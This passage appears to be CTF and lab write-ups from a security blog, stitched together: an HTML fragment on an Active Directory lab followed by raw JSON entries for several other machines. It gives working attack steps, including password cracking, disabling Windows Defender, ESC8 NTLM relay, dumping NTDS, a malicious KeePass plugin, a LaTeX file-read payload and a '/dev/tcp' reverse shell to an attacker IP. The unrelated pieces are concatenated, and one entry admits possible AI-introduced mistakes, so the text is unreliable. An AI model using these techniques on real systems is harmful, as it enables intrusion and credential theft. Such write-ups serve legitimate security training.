</span></span><span style="display:flex;"><span>	...
</span></span></code></pre></div><p>We can check the FileZilla&rsquo;s forums to see what type of hash it is, specifically I used these:</p>
<ul>
<li><a href="https://forum.filezilla-project.org/viewtopic.php?t=55179"  target="_blank" rel="noreferrer nofollow">https://forum.filezilla-project.org/viewtopic.php?t=55179</a>
</li>
<li><a href="https://forum.filezilla-project.org/viewtopic.php?t=54821"  target="_blank" rel="noreferrer nofollow">https://forum.filezilla-project.org/viewtopic.php?t=54821</a>
</li>
<li><a href="https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256"  target="_blank" rel="noreferrer nofollow">https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256</a>
</li>
</ul>
<p>We should replace the <code>+</code> with <code>.</code> in our hash before trying to crack it, the format should be this: <code>$pbkdf2-sha256$iterations$salt$hash</code></p>
<p>Since the hash doesn&rsquo;t crack with <code>rockyou</code> we should try to pass some simple rules such as:</p>
<pre tabindex="0"><code>$1$2$3
</code></pre><p>which is derived from the credentials that we gathered, specifically <code>firewalls.txt</code></p>
<pre tabindex="0"><code>$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt
</code></pre><p>This cracks to <code>....123</code>, then we can use this password to log in with <code>ssh</code> into the server:</p>
<pre tabindex="0"><code>Microsoft Windows [Version 10.0.20348.2159]
(c) Microsoft Corporation. All rights reserved.

backup@BERSRV200 C:\Users\backup&gt;
</code></pre><p>Listing the <code>C:\Users</code> we can see another users: <code>clare.frost</code> and <code>sasrv200</code>, we should keep note of them. Using the <code>users.xml</code> we can see that there is an <code>E:\</code> drive, we can explore that further.</p>
<p>We can see some interesting files there such as:</p>
<pre tabindex="0"><code>it.kdbx
filezilla-server.log
install.log
</code></pre><p>We can discover the administrator&rsquo;s hash there:</p>
<pre tabindex="0"><code>[--admin.password@index=1 --admin.password.hash=mSbrgj1R6oqMMSk4Qk1TuYTc... --admin.password.salt=AdRNx7rAs1CEM23pA.... --admin.password.iterations=100000]
</code></pre><p>And then again we can create custom wordlist to crack it</p>
<pre tabindex="0"><code>$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt
</code></pre><p>The next part of this chain is to enumerate the ports in the machine, we can see some interesting ports such as:</p>
<pre tabindex="0"><code>TCP    [::1]:14148            [::]:0                 LISTENING       3192
</code></pre><p>We can forward this port, but if we google around we can see that it is related to FileZilla Server, lets forward it:</p>
<pre tabindex="0"><code>ssh -L 127.0.0.1:8003:127.0.0.1:14148 backup@10.10.247.38
</code></pre><p>Now comes the tricky part, you have to use <strong>Windows</strong> to make this client work, I&rsquo;ve faced some issues on Linux but I know that some people have made it work. You also need to use the same version of this software, luckily under <code>Software</code> folder there is a <code>FileZilla_Server_1.8.0_win64-setup.exe</code> which we can use to start the UI (we do not need the server), then we can configure it to connect to the port that we forwarded.</p>
<!-- raw HTML omitted -->
<p>We can then enumerate the current users, but most importantly we can add our new user <code>syl:5yl</code></p>
<!-- raw HTML omitted -->
<p>Then we should be able to access the ftp server using the newly created user. Upon listing the FTP, we would notice that we have access to the account <code>sasrv200</code> because we can list files there. Since that we have READ &amp; WRITE access we can put <code>authorized_keys</code> in a <code>.ssh</code> folder with our public key.</p>
<pre tabindex="0"><code>ftp&gt; mkdir .ssh
257 &#34;/Users/sasrv200/.ssh&#34; created successfully.

</code></pre><p>Now we should be able to login as that user using <code>ssh</code>.</p>
<pre tabindex="0"><code>Microsoft Windows [Version 10.0.20348.2159]

</code></pre><p>After some further enumeration over the account we can notice that there is a process called <code>KeePass</code> that pops out every now and then.</p>
<p>I created this little script to watch for changes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ($true) {

</span></span><span style="display:flex;"><span>    Start-Sleep -Seconds <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After that, we can see that in the <code>E:\</code> drive under the <code>KeePass</code> folder there are <code>Plugins</code> folder which is empty. This hints for this malicious plugin:</p>
<ul>
<li><a href="https://github.com/d3lb3/KeeFarceReborn"  target="_blank" rel="noreferrer nofollow">https://github.com/d3lb3/KeeFarceReborn</a>
</li>
</ul>
<p>When you put your malicious plugin under the <code>Plugins</code> folder you should expect a dump of the database in <code>C:\temp</code> there will be a <code>*.xml</code> file. Eventually you will find the administrator&rsquo;s password there <code>N......Mel..</code>.</p>
<p>Then we can login with SSH.</p>
<pre tabindex="0"><code>Microsoft Windows [Version 10.0.20348.2159]

administrator@BERSRV200 C:\Users\Administrator&gt;
</code></pre><p>Let&rsquo;s disable the AV and the Firewall</p>
<pre tabindex="0"><code>cmd.exe /c &#34;powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp;&amp; powershell Set-MpPreference -SubmitSamplesConsent 2 &amp; &#34;%ProgramFiles%\Windows Defender\MpCmdRun.exe&#34; -RemoveDefinitions -All&#34;
</code></pre><pre tabindex="0"><code>Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
</code></pre><p>Now, lets copy chisel with <code>scp</code> and start it, then we can adjust our <code>proxychains</code> tool and setup a proxy to access the internal ports.</p>
<p>Upon the enumeration using the ADCS module from <code>nxc</code>, we can see that there is an enrollment server:</p>
<!-- raw HTML omitted -->
<p>We would want to see the vulnerable certificates now using <code>certipy</code></p>
<pre tabindex="0"><code>$ proxychains certipy find -username clare.frost@kaiju.vl -hashes be167.. -vulnerable -stdout -dc-ip 10.10.213.165
</code></pre><!-- raw HTML omitted -->
<p>There is ESC8 vulnerability which we can exploit.</p>
<p>The next step is quite tricky, we need to redirect the traffic that comes to the machine that we are in <code>BERSRV200</code> to other port that we then should forward to our machine where we setup a relay towards the <code>BERSRV100</code> so that we can get the authenticating certificate that we use from <code>BERSRV105</code> towards <code>BERSRV100</code>, with that certificate we can then try to get TGT from the <code>BERSRV100</code> principal which in turn will retrieve us the NT hash.</p>
<p>To setup this we would need to do these following steps:</p>
<ul>
<li>On the <code>BERSRV200</code> machine use the <a href="https://github.com/jellever/StreamDivert"  target="_blank" rel="noreferrer nofollow">https://github.com/jellever/StreamDivert</a>
 to forward the traffic from 445 to 8445</li>
<li>Forward the 8445 port on the <code>BERSRV200</code> machine towards your local machine</li>
<li>Setup a <code>ntlmrelayx</code> with the following args: <code>proxychains ntlmrelayx -t http://BERSRV100.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'</code></li>
<li>Transform the certificate from <code>b64</code> to <code>pfx</code> (simply decode it and save it to <code>pfx</code>)</li>
<li>Use <code>proxychains certipy auth -pfx cert.pfx</code> to ask for TGT, to retrieve the NT hash</li>
</ul>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Then we should be able to dump the OS credentials with the retrieved hash for the user <code>BERSRV100$</code></p>
<pre tabindex="0"><code>$ proxychains crackmapexec smb 10.10.213.165 -u &#39;BERSRV100$&#39; -H &#39;19ad5c18445fxxxxx&#39; --ntds drsuapi
</code></pre><!-- raw HTML omitted -->
<p>And then we can use the administrator&rsquo;s hash to log in using <code>winrm</code> or similar.</p>

        "content": "I\u0026rsquo;ve started with simple machine enumeration\n$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I\u0026rsquo;ve enumerated possible users:\nlklein vdaisley dabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I\u0026rsquo;ve figured out that there must be some trickery with this so I went my way to research the topic.\nI\u0026rsquo;ve found out the following:\nhttps://0day.work/hacking-with-latex/ https://salmonsec.com/cheatsheets/exploitation/latex_injection These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as /etc/passwd, /proc/self/cmdline, /proc/self/environ and so on, I\u0026rsquo;ve figured out that I must be missing something. I began to explore what other subdomains (because there is latex.topology.htb I thought there would be more) were on the webserver using ffuf.\n$ ffuf -w $commontxt -u http://topology.htb/ -H \u0026#34;Host: FUZZ.topology.htb\u0026#34; -r Which yielded the following domains:\ndev stats I\u0026rsquo;ve browsed through those and on the stats there were simple plots about the current usage of the system and that\u0026rsquo;s it. But on the dev subdomain there was a Basic Auth in place which I then figured out that I can read the .htpasswd with the LFI vulnerability in the latex.topology.htb input form.\nI\u0026rsquo;ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what\u0026rsquo;s going on.\nI honestly didn\u0026rsquo;t know how can I read the file and I turned out to some help, which I then understood that I can use the LaTeX/Source Code Listings which also can read a file with \\lstinputlisting{/var/www/dev/.htpasswd}, however the website just resulted in no image (possible error) using just this command.\nHere comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and Since the website is about math, we can use the inline math delimiters that are $ and $ which can turn my payload from \\lstinputlisting{/var/www/dev/.htpasswd} to $\\lstinputlisting{/var/www/dev/.htpasswd}$ which resulted into getting the basic auth hash.\n$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0 Using hashcat we can extract the password\n$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn With that, I tried the users that I\u0026rsquo;ve enumerated earlier and the user vdaisley worked out, so I went to log in with SSH and got the user flag.\nRoot The root was pretty easy, first we can see which directories are writable:\n$ find / -type d -writable 2\u0026gt;/dev/null ... /opt/gnuplot ... This directory looked suspicious, I\u0026rsquo;ve fired up pspy to checkout what is going on and I got this:\nSo we are finding *.plt files in this directory, and then we are executing gnuplot as root. Using this article, I\u0026rsquo;ve crafted a test.plt file with the contents of:\nvdaisley@topology:/opt/gnuplot$ cat ~/test.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.xx/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; I\u0026rsquo;ve copied the file to the /opt/gnuplot directory and I\u0026rsquo;ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.\n",

        "content": " Name OS Difficulty Baby2 Windows Medium Summary We will be exploring some SMB shares where we would find some folders of the users and a shortcut that is going to hint of a logon script that gets executed every time a user logs in. Then we are going to exploit some weak credentials and find a writable share that we can use to modify the login VBS script, that would give us the initial shell. Then we are going to exploit some WriteDACL permissions to gain GenericAll permission on our account over a targeted account, which we can use to change the password of that account. After that, this account would have GenericAll permissions over the DDP (Default Domain Policy) and we can leverage that by creating a Scheduled Task that will execute immediately to add our controlled account to the local administrators, with that we can log in with that account, and we will be a local administrator on that machine.\nInitial Foothold We are going to start with an TCP/UDP scan:\n$ sudo nmap -sS -sU 10.10.101.112 --min-rate 10000 Let\u0026rsquo;s start enumerating the surface, since that we have an SMB protocol we can start with it.\nLet\u0026rsquo;s try NULL session first:\nWe cannot list any shares using the null session, so let\u0026rsquo;s move on and try with a random username:\n$ netexec smb 10.10.101.112 -u \u0026#39;sfgsfgsf\u0026#39; -p \u0026#39;\u0026#39; --shares We successfully listed a few shares, we won\u0026rsquo;t go into the default ones, let\u0026rsquo;s see what is in the */apps and /homes:\nWe got a few files, CHANGELOG and login.vbs.lnk which is a Windows Shortcut format, from the CHANGELOG file we understood that some drive mapping is happening and from the login shortcut we can extract the following useful information using lnkinfo:\n$ lnkinfo login.vbs.lnk Local path : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Network path : \\\\DC\\NETLOGON\\login.vbs Relative path : ..\\..\\..\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Working directory : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts There is a VBS file in the SYSVOL share that we are still unsure what it does, however with the information that we have we can OSINT a bit to understand what are those files.\nWe will find this question in serverfault, which is related to a network drive mapping and some logon scripts. We can conclude that some script is firing up whenever we log in as a user, this will become useful later, so let\u0026rsquo;s note that and move on.\nNext, lets explore the /homes share.\n$ smbclient //10.10.101.112/homes -U \u0026#39;sfgsfgsf\u0026#39; This would give us a list of usernames that are most likely related to the Active Directory.

        "content": " This is an experimental write-up that I did with AI, I trying to proof-read them as well as I can, but apologies if there are misstakes.\nIn this challenge, we are presented with two target machines, each offering a different attack surface. The journey begins with a reconnaissance phase, identifying open ports and services through scanning.\nInitial Scanning and Discovery For the intra machine, the open ports discovered were:\n22/tcp for SSH 443/tcp for HTTPS On the os machine, the ports identified were:\n22/tcp for SSH 80/tcp for HTTP 443/tcp for HTTPS 8443/tcp 8444/tcp Gaining Initial Access Exploring the os machine\u0026rsquo;s HTTPS service on port 443 led us to a wiki page hinting at the use of pydio and osctrl services. Within this page, we found some valuable information, including a potential default password Sum\u0026lt;redacted\u0026gt; and a list of user accounts:\nJimmy George - j.george Ann Rodriguez - a.rodriguez Adriana Larose - a.larose Kara Leblanc - k.leblanc Steven Thibodeau - s.thibodeau Kurt Dagenais - k.dagenais Ken Pare - k.pare Yvon McBride - y.mcbride We extracted those users, from the revisions of each page.\nUtilizing the discovered password, we were able to authenticate as users y.mcbride and k.dagenais in the pydio.\nCVE 2023-32749 Leveraging CVE 2023-32749, detailed at Exploit Database , we escalated privileges by assigning an admin role to a newly created user. This vulnerability allows attackers to modify user roles, thus granting unauthorized access to sensitive cells within the application.\nExtracting Sensitive Information Within the administrative area, we intercepted a conversation mentioning the creation of a provision user with the password TeiG6im\u0026lt;redacted\u0026gt; for testing purposes on the os.control.vl server. This information provided SSH access as the provision user, from which we extracted the .ssh folder for future use.\nPyio\u0026rsquo;s Chat @Kara: I added this room to share scripts, outputs, documents for our osquery project and already added some documents. Also, as discussed I created the provision user on `os.control.vl` with password `TeiG6imee\u0026lt;redacted\u0026gt;` so we can start using your temporary provisioning solution on the first servers for testing. Database Access and Further Privilege Escalation On the same machine, a PostgreSQL database was found listening on port 5432. Accessing the database using the default postgres user revealed the osctrl database. Within this database, we targeted the admin_users table to replace the bcrypt password hash of the admin user with a known hash for the password admin, facilitating web system login.\nUPDATE admin_users SET pass_hash = \u0026#39;$2a$10$3.g.9xQtpwNpOxYsEXZX...xxMJcttMqcCw5i3imHBGJ6VJfFw41W\u0026#39; WHERE id = 1; Final Stages of System Compromise The osctrl system can be used to run arbitrary osquery queries towards the enrolled nodes, with the following query we can list files in a given directory, this is going to be useful for enumerating files in the machine.\nSELECT * FROM file WHERE path = \u0026#39;/given/path\u0026#39;; The osctrl system allowed file extraction from enrolled nodes this feature is called \u0026ldquo;craving file\u0026rdquo;. Exploiting this feature, we extracted the .ssh folder of the user kara, which contained SSH keys. These keys provided access to the kara account, which had sudo privileges, allowing us to switch to the root user.\nInfiltrating the Intra Machine Investigation on the intra machine revealed that the root user\u0026rsquo;s authorized_keys contained the provision user\u0026rsquo;s private key.\nThe authorized_key however can be run with only a few commands, stated in the command script in the authorized_keys.\n#!/usr/bin/bash # (c) 2022-2023 by Kara Leblanc # # This is a temporary server provision wrapper for control.vl unix servers. # # For security reasons the provisioning ssh key is only allowed to run # this script and not all commands on the machine. # This script will only allow to run commands that are contained in special # modules in the modules/ directory. Despite being highly secure there are # probably better solutions to our problem but we need to evaluate them. We # will therefore stick with this script for now. set -- $SSH_ORIGINAL_COMMAND if [[ -n $1 ]] ; then module=$(basename ${1}) shift if [[ -f /opt/provision/modules/$module \u0026amp;\u0026amp; -x /opt/provision/modules/$module ]] ; then exec \u0026#34;/opt/provision/modules/$module\u0026#34; \u0026#34;$@\u0026#34; fi fi The executable commands are:\nprov_osqd prov_df prov_uname Among the executable commands, prov_osqd stood out. This script, intended for enrolling systems, could be abused to execute a reverse shell by intercepting the curl request for enroll.sh and replacing it with a malicious script.\nprov_osqd script #!/usr/bin/bash if [[ -z $1 || -z $2 ]] ; then echo \u0026#34;Missing options.\u0026#34; \u0026gt;\u0026amp;2 exit 42 curl -sk https://os.control.vl/${1}/${2}/enroll.sh | bash Exploitation Summary To exploit prov_osqd, the following steps were executed:\nStopped the nginx service on the os machine. Modified the nginx configuration to proxy traffic to a local Python server on port 8000. Created nested folders on the Python server to mimic the expected path and placed a malicious enroll.sh script containing a reverse shell. Triggered prov_osqd with arbitrary arguments, resulting in the execution of the reverse shell script. This comprehensive approach allowed us to gain root privileges on the intra system.\n",

Initially, I ran those md5 hashes through the rockyou.txt list, but they didn\u0026rsquo;t match anything, so I was curious why and went to look at the source code.\nIn the file index.php located in the www folder, we would find the following code snippet:\n\u0026lt;?php session_start(); $secure = \u0026#34;6c4972f3717a5e881e282ad3105de01e\u0026#34;; if (isset($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $hash = md5(\u0026#34;$secure|$username|$password\u0026#34;); $db = new SQLite3(\u0026#39;../db/site.db\u0026#39;); $result = $db-\u0026gt;query(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;$username\u0026#39; AND password= \u0026#39;$hash\u0026#39;\u0026#34;); $row = $result-\u0026gt;fetchArray(SQLITE3_ASSOC); if ($row) { $_SESSION[\u0026#39;username\u0026#39;] = $row[\u0026#39;username\u0026#39;]; header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } else { $error_message = \u0026#39;Invalid username or password.\u0026#39;; } } ?\u0026gt; We can see that the hash is being created by the value of the variable $secure the username and the password divided by a pipe.\nI cracked those hashes with my own solution written in Go, however there might be an easier way of doing that with hashcat or other hash cracking tool.\nHere is the Go code that we can use.\npackage main import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;sync\u0026#34; ) func main() { targetHash := \u0026#34;76\u0026lt;redacted\u0026gt;\u0026#34; filename := \u0026#34;/home/syl/tools/lists/rockyou.txt\u0026#34; file, err := os.Open(filename) if err != nil { panic(err) } defer file.Close() var wg sync.WaitGroup scanner := bufio.NewScanner(file) for scanner.Scan() { wg.Add(1) go func(line string) { defer wg.Done() hashedLine := hashLine(line) if hashedLine == targetHash { fmt.Printf(\u0026#34;Match found: %s\\n\u0026#34;, line) os.Exit(0) } }(scanner.Text()) } if err := scanner.Err(); err != nil { panic(err) } wg.Wait() } func hashLine(line string) string { data := []byte(\u0026#34;6c4972f3717a5e881e282ad3105de01e|admin|\u0026#34; + line) hash := md5.Sum(data) return hex.EncodeToString(hash[:]) } We can adjust the code for each user. Within seconds of running the code, we would get a match for the triss user.\nsyl@sylsec:~/vulnlab/Sync$ go run ./scripts/custom_crack.go Match found: g...\u0026lt;redacted\u0026gt; The hash of the admin wasn\u0026rsquo;t found.\nThose credentials were valid of the FTP service, and It seemed like that we are in the home directory of that user.\nWe can try to ssh with that user, but the SSH login isn\u0026rsquo;t permitted, so we can create an SSH folder .ssh from the FTP, and we can put our public SSH key into a file named authorized_keys then we would be able to connect using our public key!\nSwitching the user and Privilege Escalation We can find more users within the /etc/passwd file.\njennifer sa triss ubuntu Upon listing the directories, we would find a folder called backup which sits in the root of the file system. In that folder there are many zip files related to some kind of backup.\nWe can exfiltrate all the files and extract them to see what\u0026rsquo;s inside.\n# After the exfiltration find . -name \u0026#39;*.zip\u0026#39; -exec sh -c \u0026#39;unzip -d \u0026#34;${1%.*}\u0026#34; \u0026#34;$1\u0026#34;\u0026#39; _ {} \\; That bash one-liner would extract each zip file in its own directory.\nWe would find that those folders are mostly the same and the name of the file is a timestamp, in my specific case here are a couple of files:\n1703495041.zip -\u0026gt; Monday, December 25, 2023 9:04:01 AM 1703495161.zip -\u0026gt; Monday, December 25, 2023 9:06:01 AM 1703495281.zip -\u0026gt; Monday, December 25, 2023 9:08:01 AM We can see a pattern here, those zip files are being created every 2 minutes. We would note that and come back for it later on.\nUpon unzipping those files, we would find the following structure:\n|-- httpd | |-- db | | `-- site.db | |-- migrate | `-- www | |-- dashboard.php | |-- index.php | `-- logout.php |-- passwd |-- rsyncd.conf `-- shadow We can inspect the passwd and the shadow files, since that they are the ones that stand out at first. And having those files, we can use the utility from john called unshadow to combine the shadow and the passwd file into a single file that we can use to crack the passwords for the users.\nTo install the tool unshadow we would need to install john\n$ sudo apt install john -y unshadow ./exfiltrated/ssh/backup/1703494921/tmp/backup/passwd ./exfiltrated/ssh/backup/1703494921/tmp/backup/shadow \u0026gt; tmp_shadow Then we can crack it (or can we?):\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --wordlist=/home/syl/tools/lists/rockyou.txt No password hashes loaded (see FAQ) We cannot load those hashes in john with the default arguments because the hash function that is being used is called yescrypt. We can conclude the hashing function by inspecting the hashes that we in the tmp_shadow file.\n$y$j9T$DBxmxcNWJlhvgfWCUTbEC0\u0026lt;redacted\u0026gt; $y$j9T$jJFOBCaiGJUmyZZRFn5aG1\u0026lt;redacted\u0026gt; ... We have the starting sequence $y$ which is related to yescrypt. If you need more information about it, you can read this! We can use the argument --fromat=crypt\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --format=crypt Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:51 0% 2/3 0g/s 87.90p/s 119.4c/s 119.4C/s leslie..boston \u0026lt;redacted\u0026gt; (jennifer) \u0026lt;redacted\u0026gt; (triss) \u0026lt;redacted\u0026gt; (sa) Now we have the passwords for the user jennifer and the user sa. Upon changing the user to jennifer we would find the user.txt hash.\nWe can not run linpeas for further enumeration on both accounts sa,jennifer and we would find that we own a file called /usr/local/bin/backup.sh. Upon inspecting the file, we would see that the file contains a script that is being used to back up the files that we saw earlier (the zipped backups).\nUsing pspy we can monitor the currently running process by all users, and we would see that a backup is being created every 2 minutes (just like the timestamps we saw earlier).\nWe can edit the script, and we can add the line chmod u+s /bin/bash to the end of it. After 2 minutes, we can see if it works by invoking /bin/bash -p, that would give us the root.\n",
